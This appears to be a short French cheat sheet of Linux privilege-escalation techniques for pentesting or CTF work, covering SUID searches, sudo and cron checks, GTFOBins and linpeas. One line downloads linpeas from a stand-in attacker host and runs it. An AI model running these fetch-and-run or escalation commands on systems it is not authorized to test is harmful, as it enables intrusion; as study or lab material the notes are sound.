# Linux

## Stratégie

* version de linux -> exploit ?
* historique utilisateur, bashrc, bash history, variable ENV
* si y'a des cron qui tournent avec des droits en écriture le mettre
* GTFOBins, LOLBins sur la machine qui peuvent servir à faire une elevation de privilège -> va sur GTFO et regarde comment l'exploiter : gtfobins.github.io
* sudo -l pour voir ce que tu peux exec en root, et si un binaire regarde sur GTFO
* find / -perm -u=s -type f 2>/dev/null -> sort une liste de binaire et regarde s'ils sont en GTFO

## Outils

* Mimikatz, Linpeas.sh
* GTFOBins, LOLBins

## Commandes

```
- linpeas.sh : Script d’audit pour découvrir des moyens d’escalader les privilèges.
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# regarder les groups du users
id
# regarder les binaires liés à un group
find / -group bugtracker 2>/dev/null
# infos sur un fichier (looking for setuid, suid)
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

sudo -l
crontab -l
env
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
getcap -r / 2>/dev/null

ps aux
ss -tln
netstat -taupen
```
